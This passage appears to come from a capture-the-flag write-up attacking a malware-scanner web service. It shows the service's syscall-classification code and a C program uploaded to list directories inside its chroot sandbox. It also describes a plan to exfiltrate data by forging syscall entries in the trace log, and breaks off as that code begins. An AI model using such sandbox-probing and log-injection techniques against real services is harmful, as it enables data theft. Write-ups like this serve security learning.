+<span class="mtk7 mtki">class</span> <span class="mtk8 mtku">SyscallClass</span><span class=mtk1>(</span><span class="mtk8 mtku">enum</span><span class=mtk1>.</span><span class="mtk8 mtku">Enum</span><span class=mtk1>):</span>
+    <span class=mtk1>Ignore</span> <span class=mtk5>=</span> <span class=mtk6>0</span>
+    <span class=mtk1>Low</span> <span class=mtk5>=</span> <span class=mtk6>1</span>
+    <span class=mtk1>Medium</span> <span class=mtk5>=</span> <span class=mtk6>2</span>
+    <span class=mtk1>High</span> <span class=mtk5>=</span> <span class=mtk6>3</span>
+
+    <span class="mtk7 mtki">def</span> <span class=mtk7>__gt__</span><span class=mtk1>(</span><span class="mtk9 mtki">self</span><span class=mtk1>,</span> <span class="mtk9 mtki">other</span><span class=mtk1>):</span>
+        <span class=mtk5>if</span> <span class=mtk8>isinstance</span><span class=mtk1>(</span><span class="mtk9 mtki">other</span><span class=mtk1>,</span> <span class="mtk8 mtku">numbers</span><span class=mtk1>.</span><span class="mtk8 mtku">Real</span><span class=mtk1>):</span>
+            <span class=mtk5>return</span> <span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>value</span> <span class=mtk5>&gt;</span> <span class="mtk9 mtki">other</span>
+        <span class=mtk5>return</span> <span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>value</span> <span class=mtk5>&gt;</span> <span class="mtk9 mtki">other</span><span class=mtk1>.value</span>
+
+    <span class="mtk7 mtki">def</span> <span class=mtk7>__lt__</span><span class=mtk1>(</span><span class="mtk9 mtki">self</span><span class=mtk1>,</span> <span class="mtk9 mtki">other</span><span class=mtk1>):</span>
+        <span class=mtk5>if</span> <span class=mtk8>isinstance</span><span class=mtk1>(</span><span class="mtk9 mtki">other</span><span class=mtk1>,</span> <span class="mtk8 mtku">numbers</span><span class=mtk1>.</span><span class="mtk8 mtku">Real</span><span class=mtk1>):</span>
+            <span class=mtk5>return</span> <span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>value</span> <span class=mtk5>&lt;</span> <span class="mtk9 mtki">other</span>
+        <span class=mtk5>return</span> <span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>value</span> <span class=mtk5>&lt;</span> <span class="mtk9 mtki">other</span><span class=mtk1>.value</span>
+
+
+<span class=mtk3>#</span> <span class=mtk3>Class,</span> <span class=mtk3>name,</span> <span class=mtk3>syscall</span> <span class=mtk3>number,</span> <span class=mtk3>arg</span> <span class=mtk3>count</span>
+<span class=mtk1>syscalls</span> <span class=mtk5>=</span> <span class=mtk1>[</span>
+    <span class=mtk1>[</span><span class="mtk8 mtku">SyscallClass</span><span class=mtk1>.</span><span class=mtk1>Low</span><span class=mtk1>,</span> <span class=mtk4>"read"</span><span class=mtk1>,</span> <span class=mtk6>0</span><span class=mtk1>,</span> <span class=mtk6>3</span><span class=mtk1>],</span>
+    <span class=mtk1>[</span><span class="mtk8 mtku">SyscallClass</span><span class=mtk1>.</span><span class=mtk1>Low</span><span class=mtk1>,</span> <span class=mtk4>"write"</span><span class=mtk1>,</span> <span class=mtk6>1</span><span class=mtk1>,</span> <span class=mtk6>3</span><span class=mtk1>],</span>
+    <span class=mtk1>[</span><span class="mtk8 mtku">SyscallClass</span><span class=mtk1>.</span><span class=mtk1>Medium</span><span class=mtk1>,</span> <span class=mtk4>"open"</span><span class=mtk1>,</span> <span class=mtk6>2</span><span class=mtk1>,</span> <span class=mtk6>3</span><span class=mtk1>],</span>
+    <span class=mtk1>[</span><span class="mtk8 mtku">SyscallClass</span><span class=mtk1>.</span><span class=mtk1>Low</span><span class=mtk1>,</span> <span class=mtk4>"close"</span><span class=mtk1>,</span> <span class=mtk6>3</span><span class=mtk1>,</span> <span class=mtk6>1</span><span class=mtk1>],</span>
+    <span class=mtk1>[</span><span class="mtk8 mtku">SyscallClass</span><span class=mtk1>.</span><span class=mtk1>Medium</span><span class=mtk1>,</span> <span class=mtk4>"stat"</span><span class=mtk1>,</span> <span class=mtk6>4</span><span class=mtk1>,</span> <span class=mtk6>2</span><span class=mtk1>],</span>
+    <span class=mtk1>[</span><span class="mtk8 mtku">SyscallClass</span><span class=mtk1>.</span><span class=mtk1>Medium</span><span class=mtk1>,</span> <span class=mtk4>"fstat"</span><span class=mtk1>,</span> <span class=mtk6>5</span><span class=mtk1>,</span> <span class=mtk6>2</span><span class=mtk1>],</span>
+    <span class=mtk1>[</span><span class="mtk8 mtku">SyscallClass</span><span class=mtk1>.</span><span class=mtk1>Medium</span><span class=mtk1>,</span> <span class=mtk4>"lstat"</span><span class=mtk1>,</span> <span class=mtk6>6</span><span class=mtk1>,</span> <span class=mtk6>2</span><span class=mtk1>],</span>
+    <span class=mtk1>[</span><span class="mtk8 mtku">SyscallClass</span><span class=mtk1>.</span><span class=mtk1>Medium</span><span class=mtk1>,</span> <span class=mtk4>"access"</span><span class=mtk1>,</span> <span class=mtk6>21</span><span class=mtk1>,</span> <span class=mtk6>2</span><span class=mtk1>],</span>
+    <span class=mtk1>[</span><span class="mtk8 mtku">SyscallClass</span><span class=mtk1>.</span><span class=mtk1>Low</span><span class=mtk1>,</span> <span class=mtk4>"alarm"</span><span class=mtk1>,</span> <span class=mtk6>37</span><span class=mtk1>,</span> <span class=mtk6>1</span><span class=mtk1>],</span>
+    <span class=mtk1>[</span><span class="mtk8 mtku">SyscallClass</span><span class=mtk1>.</span><span class=mtk1>High</span><span class=mtk1>,</span> <span class=mtk4>"socket"</span><span class=mtk1>,</span> <span class=mtk6>41</span><span class=mtk1>,</span> <span class=mtk6>3</span><span class=mtk1>],</span>
+    <span class=mtk1>[</span><span class="mtk8 mtku">SyscallClass</span><span class=mtk1>.</span><span class=mtk1>High</span><span class=mtk1>,</span> <span class=mtk4>"connect"</span><span class=mtk1>,</span> <span class=mtk6>42</span><span class=mtk1>,</span> <span class=mtk6>3</span><span class=mtk1>],</span>
+    <span class=mtk1>[</span><span class="mtk8 mtku">SyscallClass</span><span class=mtk1>.</span><span class=mtk1>High</span><span class=mtk1>,</span> <span class=mtk4>"accept"</span><span class=mtk1>,</span> <span class=mtk6>43</span><span class=mtk1>,</span> <span class=mtk6>3</span><span class=mtk1>],</span>
+    <span class=mtk1>[</span><span class="mtk8 mtku">SyscallClass</span><span class=mtk1>.</span><span class=mtk1>High</span><span class=mtk1>,</span> <span class=mtk4>"shutdown"</span><span class=mtk1>,</span> <span class=mtk6>48</span><span class=mtk1>,</span> <span class=mtk6>2</span><span class=mtk1>],</span>
+    <span class=mtk1>[</span><span class="mtk8 mtku">SyscallClass</span><span class=mtk1>.</span><span class=mtk1>High</span><span class=mtk1>,</span> <span class=mtk4>"bind"</span><span class=mtk1>,</span> <span class=mtk6>49</span><span class=mtk1>,</span> <span class=mtk6>3</span><span class=mtk1>],</span>
+    <span class=mtk1>[</span><span class="mtk8 mtku">SyscallClass</span><span class=mtk1>.</span><span class=mtk1>High</span><span class=mtk1>,</span> <span class=mtk4>"listen"</span><span class=mtk1>,</span> <span class=mtk6>50</span><span class=mtk1>,</span> <span class=mtk6>2</span><span class=mtk1>],</span>
+    <span class=mtk1>[</span><span class="mtk8 mtku">SyscallClass</span><span class=mtk1>.</span><span class=mtk1>Medium</span><span class=mtk1>,</span> <span class=mtk4>"clone"</span><span class=mtk1>,</span> <span class=mtk6>56</span><span class=mtk1>,</span> <span class=mtk6>5</span><span class=mtk1>],</span>
+    <span class=mtk1>[</span><span class="mtk8 mtku">SyscallClass</span><span class=mtk1>.</span><span class=mtk1>Medium</span><span class=mtk1>,</span> <span class=mtk4>"fork"</span><span class=mtk1>,</span> <span class=mtk6>57</span><span class=mtk1>,</span> <span class=mtk6>0</span><span class=mtk1>],</span>
+    <span class=mtk1>[</span><span class="mtk8 mtku">SyscallClass</span><span class=mtk1>.</span><span class=mtk1>Medium</span><span class=mtk1>,</span> <span class=mtk4>"vfork"</span><span class=mtk1>,</span> <span class=mtk6>58</span><span class=mtk1>,</span> <span class=mtk6>0</span><span class=mtk1>],</span>
+    <span class=mtk1>[</span><span class="mtk8 mtku">SyscallClass</span><span class=mtk1>.</span><span class=mtk1>High</span><span class=mtk1>,</span> <span class=mtk4>"execve"</span><span class=mtk1>,</span> <span class=mtk6>59</span><span class=mtk1>,</span> <span class=mtk6>3</span><span class=mtk1>],</span>
+    <span class=mtk1>[</span><span class="mtk8 mtku">SyscallClass</span><span class=mtk1>.</span><span class=mtk1>High</span><span class=mtk1>,</span> <span class=mtk4>"kill"</span><span class=mtk1>,</span> <span class=mtk6>62</span><span class=mtk1>,</span> <span class=mtk6>2</span><span class=mtk1>],</span>
+    <span class=mtk1>[</span><span class="mtk8 mtku">SyscallClass</span><span class=mtk1>.</span><span class=mtk1>Medium</span><span class=mtk1>,</span> <span class=mtk4>"uname"</span><span class=mtk1>,</span> <span class=mtk6>63</span><span class=mtk1>,</span> <span class=mtk6>1</span><span class=mtk1>],</span>
+    <span class=mtk1>[</span><span class="mtk8 mtku">SyscallClass</span><span class=mtk1>.</span><span class=mtk1>Medium</span><span class=mtk1>,</span> <span class=mtk4>"getdents"</span><span class=mtk1>,</span> <span class=mtk6>78</span><span class=mtk1>,</span> <span class=mtk6>3</span><span class=mtk1>],</span>
+    <span class=mtk1>[</span><span class="mtk8 mtku">SyscallClass</span><span class=mtk1>.</span><span class=mtk1>Medium</span><span class=mtk1>,</span> <span class=mtk4>"getcwd"</span><span class=mtk1>,</span> <span class=mtk6>79</span><span class=mtk1>,</span> <span class=mtk6>2</span><span class=mtk1>],</span>
+    <span class=mtk1>[</span><span class="mtk8 mtku">SyscallClass</span><span class=mtk1>.</span><span class=mtk1>Medium</span><span class=mtk1>,</span> <span class=mtk4>"chdir"</span><span class=mtk1>,</span> <span class=mtk6>80</span><span class=mtk1>,</span> <span class=mtk6>1</span><span class=mtk1>],</span>
+    <span class=mtk1>[</span><span class="mtk8 mtku">SyscallClass</span><span class=mtk1>.</span><span class=mtk1>Medium</span><span class=mtk1>,</span> <span class=mtk4>"fchdir"</span><span class=mtk1>,</span> <span class=mtk6>81</span><span class=mtk1>,</span> <span class=mtk6>1</span><span class=mtk1>],</span>
+    <span class=mtk1>[</span><span class="mtk8 mtku">SyscallClass</span><span class=mtk1>.</span><span class=mtk1>High</span><span class=mtk1>,</span> <span class=mtk4>"rename"</span><span class=mtk1>,</span> <span class=mtk6>82</span><span class=mtk1>,</span> <span class=mtk6>2</span><span class=mtk1>],</span>
+    <span class=mtk1>[</span><span class="mtk8 mtku">SyscallClass</span><span class=mtk1>.</span><span class=mtk1>Low</span><span class=mtk1>,</span> <span class=mtk4>"mkdir"</span><span class=mtk1>,</span> <span class=mtk6>83</span><span class=mtk1>,</span> <span class=mtk6>2</span><span class=mtk1>],</span>
+    <span class=mtk1>[</span><span class="mtk8 mtku">SyscallClass</span><span class=mtk1>.</span><span class=mtk1>High</span><span class=mtk1>,</span> <span class=mtk4>"rmdir"</span><span class=mtk1>,</span> <span class=mtk6>84</span><span class=mtk1>,</span> <span class=mtk6>1</span><span class=mtk1>],</span>
+    <span class=mtk1>[</span><span class="mtk8 mtku">SyscallClass</span><span class=mtk1>.</span><span class=mtk1>High</span><span class=mtk1>,</span> <span class=mtk4>"unlink"</span><span class=mtk1>,</span> <span class=mtk6>87</span><span class=mtk1>,</span> <span class=mtk6>1</span><span class=mtk1>],</span>
+    <span class=mtk1>[</span><span class="mtk8 mtku">SyscallClass</span><span class=mtk1>.</span><span class=mtk1>Medium</span><span class=mtk1>,</span> <span class=mtk4>"chmod"</span><span class=mtk1>,</span> <span class=mtk6>90</span><span class=mtk1>,</span> <span class=mtk6>2</span><span class=mtk1>],</span>
+    <span class=mtk1>[</span><span class="mtk8 mtku">SyscallClass</span><span class=mtk1>.</span><span class=mtk1>Medium</span><span class=mtk1>,</span> <span class=mtk4>"fchmod"</span><span class=mtk1>,</span> <span class=mtk6>91</span><span class=mtk1>,</span> <span class=mtk6>2</span><span class=mtk1>],</span>
+    <span class=mtk1>[</span><span class="mtk8 mtku">SyscallClass</span><span class=mtk1>.</span><span class=mtk1>High</span><span class=mtk1>,</span> <span class=mtk4>"chown"</span><span class=mtk1>,</span> <span class=mtk6>92</span><span class=mtk1>,</span> <span class=mtk6>3</span><span class=mtk1>],</span>
+    <span class=mtk1>[</span><span class="mtk8 mtku">SyscallClass</span><span class=mtk1>.</span><span class=mtk1>High</span><span class=mtk1>,</span> <span class=mtk4>"fchown"</span><span class=mtk1>,</span> <span class=mtk6>93</span><span class=mtk1>,</span> <span class=mtk6>3</span><span class=mtk1>],</span>
+    <span class=mtk1>[</span><span class="mtk8 mtku">SyscallClass</span><span class=mtk1>.</span><span class=mtk1>High</span><span class=mtk1>,</span> <span class=mtk4>"ptrace"</span><span class=mtk1>,</span> <span class=mtk6>101</span><span class=mtk1>,</span> <span class=mtk6>4</span><span class=mtk1>],</span>
+<span class=mtk1>]</span>
+
+<span class=mtk1>template</span> <span class=mtk5>=</span> <span class=mtk4>"""&lt;div</span> <span class=mtk4>class="alert</span> <span class=mtk4>alert-</span><span class=mtk6>{}</span><span class=mtk4>"</span> <span class=mtk4>style="width:</span> <span class=mtk4>80%"</span> <span class=mtk4>role="alert"&gt;</span>
+<span class=mtk4>&lt;p</span> <span class=mtk4>style="font-family:</span> <span class=mtk4>Courier</span> <span class=mtk4>New,Courier,Lucida</span> <span class=mtk4>Sans</span> <span class=mtk4>Typewriter,Lucida</span> <span class=mtk4>Typewriter,monospace;"&gt;</span><span class=mtk6>{}</span><span class=mtk4>(</span><span class=mtk6>{}</span><span class=mtk4>)</span> <span class=mtk4>=</span> <span class=mtk6>{}</span><span class=mtk4>&lt;/pre&gt;</span>  
+<span class=mtk4>&lt;/div&gt;</span>
+<span class=mtk4>"""</span>
+
+
+<span class="mtk7 mtki">class</span> <span class="mtk8 mtku">LoggedSyscall</span><span class=mtk1>:</span>
+    <span class=mtk1>sys_num</span><span class=mtk1>:</span> <span class="mtk8 mtku">int</span>
+    <span class=mtk1>rdi</span><span class=mtk1>:</span> <span class="mtk8 mtku">int</span>
+    <span class=mtk1>rsi</span><span class=mtk1>:</span> <span class="mtk8 mtku">int</span>
+    <span class=mtk1>rdx</span><span class=mtk1>:</span> <span class="mtk8 mtku">int</span>
+    <span class=mtk1>r10</span><span class=mtk1>:</span> <span class="mtk8 mtku">int</span>
+    <span class=mtk1>r8</span><span class=mtk1>:</span> <span class="mtk8 mtku">int</span>
+    <span class=mtk1>r9</span><span class=mtk1>:</span> <span class="mtk8 mtku">int</span>
+    <span class=mtk1>ret</span><span class=mtk1>:</span> <span class="mtk8 mtku">int</span>
+
+    <span class="mtk7 mtki">def</span> <span class=mtk7>__init__</span><span class=mtk1>(</span><span class="mtk9 mtki">self</span><span class=mtk1>,</span> <span class="mtk9 mtki">values</span><span class=mtk1>):</span>
+        <span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>sys_num</span><span class=mtk1>,</span> <span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>rdi</span><span class=mtk1>,</span> <span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>rsi</span><span class=mtk1>,</span> <span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>rdx</span><span class=mtk1>,</span> <span class=mtk1>\</span>
+            <span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>r10</span><span class=mtk1>,</span> <span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>r8</span><span class=mtk1>,</span> <span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>r9</span><span class=mtk1>,</span> <span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>ret</span> <span class=mtk5>=</span> <span class="mtk9 mtki">values</span>
+
+    <span class="mtk7 mtki">def</span> <span class=mtk8>get_args</span><span class=mtk1>(</span><span class="mtk9 mtki">self</span><span class=mtk1>,</span> <span class="mtk9 mtki">count</span><span class=mtk1>)</span> <span class=mtk1>-&gt;</span> <span class=mtk1>List</span><span class=mtk1>[</span><span class="mtk8 mtku">int</span><span class=mtk1>]:</span>
+        <span class=mtk5>if</span> <span class="mtk9 mtki">count</span> <span class=mtk5>==</span> <span class=mtk6>0</span><span class=mtk1>:</span>
+            <span class=mtk5>return</span> <span class=mtk1>[]</span>
+        <span class=mtk5>if</span> <span class="mtk9 mtki">count</span> <span class=mtk5>==</span> <span class=mtk6>1</span><span class=mtk1>:</span>
+            <span class=mtk5>return</span> <span class=mtk1>[</span><span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>rdi</span><span class=mtk1>]</span>
+        <span class=mtk5>if</span> <span class="mtk9 mtki">count</span> <span class=mtk5>==</span> <span class=mtk6>2</span><span class=mtk1>:</span>
+            <span class=mtk5>return</span> <span class=mtk1>[</span><span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>rdi</span><span class=mtk1>,</span> <span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>rsi</span><span class=mtk1>]</span>
+        <span class=mtk5>if</span> <span class="mtk9 mtki">count</span> <span class=mtk5>==</span> <span class=mtk6>3</span><span class=mtk1>:</span>
+            <span class=mtk5>return</span> <span class=mtk1>[</span><span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>rdi</span><span class=mtk1>,</span> <span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>rsi</span><span class=mtk1>,</span> <span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>rdx</span><span class=mtk1>]</span>
+        <span class=mtk5>if</span> <span class="mtk9 mtki">count</span> <span class=mtk5>==</span> <span class=mtk6>4</span><span class=mtk1>:</span>
+            <span class=mtk5>return</span> <span class=mtk1>[</span><span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>rdi</span><span class=mtk1>,</span> <span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>rsi</span><span class=mtk1>,</span> <span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>rdx</span><span class=mtk1>,</span> <span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>r10</span><span class=mtk1>]</span>
+        <span class=mtk5>if</span> <span class="mtk9 mtki">count</span> <span class=mtk5>==</span> <span class=mtk6>5</span><span class=mtk1>:</span>
+            <span class=mtk5>return</span> <span class=mtk1>[</span><span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>rdi</span><span class=mtk1>,</span> <span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>rsi</span><span class=mtk1>,</span> <span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>rdx</span><span class=mtk1>,</span> <span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>r10</span><span class=mtk1>,</span> <span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>r8</span><span class=mtk1>]</span>
+        <span class=mtk5>if</span> <span class="mtk9 mtki">count</span> <span class=mtk5>==</span> <span class=mtk6>6</span><span class=mtk1>:</span>
+            <span class=mtk5>return</span> <span class=mtk1>[</span><span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>rdi</span><span class=mtk1>,</span> <span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>rsi</span><span class=mtk1>,</span> <span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>rdx</span><span class=mtk1>,</span> <span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>r10</span><span class=mtk1>,</span> <span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>r8</span><span class=mtk1>,</span> <span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>r9</span><span class=mtk1>]</span>
+
+    <span class="mtk7 mtki">def</span> <span class=mtk8>render</span><span class=mtk1>(</span><span class="mtk9 mtki">self</span><span class=mtk1>)</span> <span class=mtk1>-&gt;</span> <span class="mtk8 mtku">Tuple</span><span class=mtk1>[</span><span class="mtk8 mtku">SyscallClass</span><span class=mtk1>,</span> <span class="mtk8 mtku">str</span><span class=mtk1>]:</span>
+        <span class=mtk1>status</span> <span class=mtk5>=</span> <span class=mtk4>"light"</span>
+        <span class=mtk5>for</span> <span class=mtk1>sys_entry</span> <span class=mtk5>in</span> <span class=mtk1>syscalls</span><span class=mtk1>:</span>
+            <span class=mtk5>if</span> <span class=mtk1>sys_entry</span><span class=mtk1>[</span><span class=mtk6>2</span><span class=mtk1>]</span> <span class=mtk5>==</span> <span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>sys_num</span><span class=mtk1>:</span>
+                <span class=mtk5>if</span> <span class=mtk1>sys_entry</span><span class=mtk1>[</span><span class=mtk6>0</span><span class=mtk1>]</span> <span class=mtk5>==</span> <span class="mtk8 mtku">SyscallClass</span><span class=mtk1>.</span><span class=mtk1>Low</span><span class=mtk1>:</span>
+                    <span class=mtk1>status</span> <span class=mtk5>=</span> <span class=mtk4>"success"</span>
+                <span class=mtk5>elif</span> <span class=mtk1>sys_entry</span><span class=mtk1>[</span><span class=mtk6>0</span><span class=mtk1>]</span> <span class=mtk5>==</span> <span class="mtk8 mtku">SyscallClass</span><span class=mtk1>.</span><span class=mtk1>Medium</span><span class=mtk1>:</span>
+                    <span class=mtk1>status</span> <span class=mtk5>=</span> <span class=mtk4>"warning"</span>
+                <span class=mtk5>elif</span> <span class=mtk1>sys_entry</span><span class=mtk1>[</span><span class=mtk6>0</span><span class=mtk1>]</span> <span class=mtk5>==</span> <span class="mtk8 mtku">SyscallClass</span><span class=mtk1>.</span><span class=mtk1>High</span><span class=mtk1>:</span>
+                    <span class=mtk1>status</span> <span class=mtk5>=</span> <span class=mtk4>"danger"</span>
+                <span class=mtk1>rendered</span> <span class=mtk5>=</span> <span class=mtk1>template</span><span class=mtk1>.</span><span class=mtk8>format</span><span class=mtk1>(</span><span class=mtk1>status</span><span class=mtk1>,</span> <span class="mtk7 mtki">f</span><span class=mtk4>"</span><span class=mtk6>{</span><span class=mtk1>sys_entry</span><span class=mtk1>[</span><span class=mtk6>1</span><span class=mtk1>]</span><span class=mtk6>}</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk4>",</span> <span class=mtk4>"</span><span class=mtk1>.</span><span class=mtk8>join</span><span class=mtk1>([</span>
+                    <span class=mtk8>hex</span><span class=mtk1>(</span><span class=mtk1>x</span><span class=mtk1>)</span> <span class=mtk5>for</span> <span class=mtk1>x</span> <span class=mtk5>in</span> <span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk8>get_args</span><span class=mtk1>(</span><span class=mtk1>sys_entry</span><span class=mtk1>[</span><span class=mtk6>3</span><span class=mtk1>])</span>
+                <span class=mtk1>]),</span> <span class=mtk8>hex</span><span class=mtk1>(</span><span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>ret</span><span class=mtk1>))</span>
+                <span class=mtk5>return</span> <span class=mtk1>sys_entry</span><span class=mtk1>[</span><span class=mtk6>0</span><span class=mtk1>],</span> <span class=mtk1>rendered</span>
+        <span class=mtk1>rendered</span> <span class=mtk5>=</span> <span class=mtk1>template</span><span class=mtk1>.</span><span class=mtk8>format</span><span class=mtk1>(</span><span class=mtk1>status</span><span class=mtk1>,</span> <span class="mtk7 mtki">f</span><span class=mtk4>"sys_</span><span class=mtk6>{</span><span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>sys_num</span><span class=mtk6>}</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk4>""</span><span class=mtk1>,</span> <span class=mtk8>hex</span><span class=mtk1>(</span><span class="mtk9 mtki">self</span><span class=mtk1>.</span><span class=mtk1>ret</span><span class=mtk1>))</span>
+        <span class=mtk5>return</span> <span class="mtk8 mtku">SyscallClass</span><span class=mtk1>.</span><span class=mtk1>Ignore</span><span class=mtk1>,</span> <span class=mtk1>rendered</span>
+</code></pre></div><h2 id=abusing-misconfigurations>Abusing misconfigurations</h2><p>First of all, we might want to escape from <code>chroot</code> jail by using the traditional technique of creating another <code>chroot</code> environment and climbing up to the real root directory and calling <code>chroot</code> again. However, this doesn&rsquo;t work because the <code>chroot</code> environment is correctly setup.</p><p>In order to do some tests locally, I copied the sources in this machine and started the same project they have:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> <span class=mtku>manage.py</span> migrate
+<span class=code-cyan>Operations to perform:</span>
+  Apply all migrations: admin, auth, contenttypes, sessions
+<span class=code-cyan>Running migrations:</span>
+  Applying contenttypes.0001_initial... <span class=code-green>OK</span>
+  Applying auth.0001_initial... <span class=code-green>OK</span>
+  Applying admin.0001_initial... <span class=code-green>OK</span>
+  Applying admin.0002_logentry_remove_auto_add... <span class=code-green>OK</span>
+  Applying admin.0003_logentry_add_action_flag_choices... <span class=code-green>OK</span>
+  Applying contenttypes.0002_remove_content_type_name... <span class=code-green>OK</span>
+  Applying auth.0002_alter_permission_name_max_length... <span class=code-green>OK</span>
+  Applying auth.0003_alter_user_email_max_length... <span class=code-green>OK</span>
+  Applying auth.0004_alter_user_username_opts... <span class=code-green>OK</span>
+  Applying auth.0005_alter_user_last_login_null... <span class=code-green>OK</span>
+  Applying auth.0006_require_contenttypes_0002... <span class=code-green>OK</span>
+  Applying auth.0007_alter_validators_add_error_messages... <span class=code-green>OK</span>  
+  Applying auth.0008_alter_user_username_max_length... <span class=code-green>OK</span>
+  Applying auth.0009_alter_user_last_name_max_length... <span class=code-green>OK</span>
+  Applying auth.0010_alter_group_name_max_length... <span class=code-green>OK</span>
+  Applying auth.0011_update_proxy_permissions... <span class=code-green>OK</span>
+  Applying auth.0012_alter_user_first_name_max_length... <span class=code-green>OK</span>
+  Applying sessions.0001_initial... <span class=code-green>OK</span>
+
+<span class=code-cyan>$</span> <span class=code-dark-green>python3</span> <span class=mtku>manage.py</span> runserver
+Watching for file changes with StatReloader
+Performing system checks...
+
+System check identified no issues (0 silenced).
+Django version 3.2.6, using settings 'malscanner.settings'
+Starting development server at http://127.0.0.1:8000/
+Quit the server with CONTROL-C.
+</code></pre></div><p>Since traditional <code>chroot</code> escapes don&rsquo;t work, we need to keep things simple. For example, we can try to list directories from the malware binary perspective using this C script:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk5>#include</span> <span class=mtk4>&lt;dirent.h&gt;</span>
+<span class=mtk5>#include</span> <span class=mtk4>&lt;stdio.h&gt;</span>
+
+<span class="mtk7 mtki">int</span> <span class=mtk8>main</span><span class=mtk1>()</span> <span class=mtk1>{</span>
+  <span class=mtk1>DIR</span><span class=mtk5>*</span> <span class=mtk1>dr;</span>
+  <span class="mtk7 mtki">struct</span> <span class=mtk1>dirent</span> <span class=mtk5>*</span><span class=mtk1>de;</span>
+
+  <span class=mtk1>dr</span> <span class=mtk5>=</span> <span class=mtk8>opendir</span><span class=mtk1>(</span><span class=mtk4>"."</span><span class=mtk1>);</span>
+
+  <span class=mtk5>if</span> <span class=mtk1>(dr</span> <span class=mtk5>==</span> <span class=mtk6>NULL</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+    <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"Could</span> <span class=mtk4>not</span> <span class=mtk4>open</span> <span class=mtk4>current</span> <span class=mtk4>directory"</span><span class=mtk1>);</span>  
+    <span class=mtk5>return</span> <span class=mtk6>1</span><span class=mtk1>;</span>
+  <span class=mtk1>}</span>
+
+  <span class=mtk5>while</span> <span class=mtk1>((de</span> <span class=mtk5>=</span> <span class=mtk8>readdir</span><span class=mtk1>(dr))</span> <span class=mtk5>!=</span> <span class=mtk6>NULL</span><span class=mtk1>)</span> <span class=mtk1>{</span>
+    <span class=mtk8>printf</span><span class=mtk1>(</span><span class=mtk4>"</span><span class=mtk6>%s\n</span><span class=mtk4>"</span><span class=mtk1>,</span> <span class=mtk1>de-&gt;d_name);</span>
+  <span class=mtk1>}</span>
+
+  <span class=mtk8>closedir</span><span class=mtk1>(dr);</span>
+
+  <span class=mtk5>return</span> <span class=mtk6>0</span><span class=mtk1>;</span>
+<span class=mtk1>}</span>
+</code></pre></div><p>We compile it and upload it and we see the output in the server log:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>[] <span class=code-dark-green>"GET /scanner/upload HTTP/1.1" 301 0</span>
+[] "GET /scanner/upload/ HTTP/1.1" 200 2189
+usr
+.
+lib
+userprog
+bin
+proc
+..
+lib64
+log
+Exited
+[] <span class=code-dark-green>"POST /scanner/upload/ HTTP/1.1" 302 0</span>
+[] <span class=code-dark-green>"GET /viewer/ce6407480db61da2177849329f4aeb83 HTTP/1.1" 301 0</span>
+[] "GET /viewer/ce6407480db61da2177849329f4aeb83/ HTTP/1.1" 200 18239  
+</code></pre></div><p>Alright, so we have those directories and files. We can continue enumerating the file system locally from the server log, but eventually, we need to find a way to have an output.</p><p>In fact, there is a very cool way using the <code>log</code> file. We can insert the information we want to exfiltrate as if it were a <code>syscall</code> instruction inside the <code>log</code>, so that the web server prints it out in the report. Then, we can extract the information.</p><p>We can make use of the same functions that are in <code>tracing.c</code> from the source code we have and write them in the <code>log</code>:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk5>#include</span> <span class=mtk4>&lt;dirent.h&gt;</span>
